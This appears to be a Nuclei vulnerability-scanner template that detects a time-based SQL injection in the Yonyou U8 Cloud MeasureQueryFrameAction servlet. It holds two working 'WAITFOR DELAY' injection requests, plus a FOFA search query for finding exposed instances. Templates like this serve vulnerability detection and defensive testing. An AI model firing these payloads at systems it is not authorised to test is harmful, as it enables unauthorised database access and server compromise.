http:
    - matchers:
        - condition: and
          dsl:
            - duration_1>=4 && duration_1<=5
            - duration_2>=8 && duration_2<=9
          type: dsl
      raw:
        - |
          GET /service/~iufo/com.ufida.web.action.ActionServlet?action=nc.ui.iufo.query.measurequery.MeasureQueryFrameAction&method=doRefresh&TableSelectedID=1%27);WAITFOR+DELAY+%270:0:4%27-- HTTP/1.1
          Host: {{Hostname}}
        - |
          GET /service/~iufo/com.ufida.web.action.ActionServlet?action=nc.ui.iufo.query.measurequery.MeasureQueryFrameAction&method=doRefresh&TableSelectedID=1%27);WAITFOR+DELAY+%270:0:8%27-- HTTP/1.1
          Host: {{Hostname}}
id: yongyouU8-Cloud-MeasureQueryFrameAction-sql
info:
    author: Superhero
    description: |-
        fofa: title=="U8C"
        用友U8 Cloud MeasureQueryFrameAction接口处存在SQL注入漏洞，未经身份验证的远程攻击者除了可以利用 SQL 注入漏洞获取数据库中的信息（例如，管理员后台密码、站点的用户个人信息）之外，甚至在高权限的情况可向服务器中写入木马，进一步获取服务器系统权限。
    name: 用友U8 Cloud MeasureQueryFrameAction SQL注入漏洞
    reference:
        - https://blog.csdn.net/m0_60571842/article/details/140771763
    severity: high
    tags:
        - 用友u8
        - Servlet
        - 用友U8
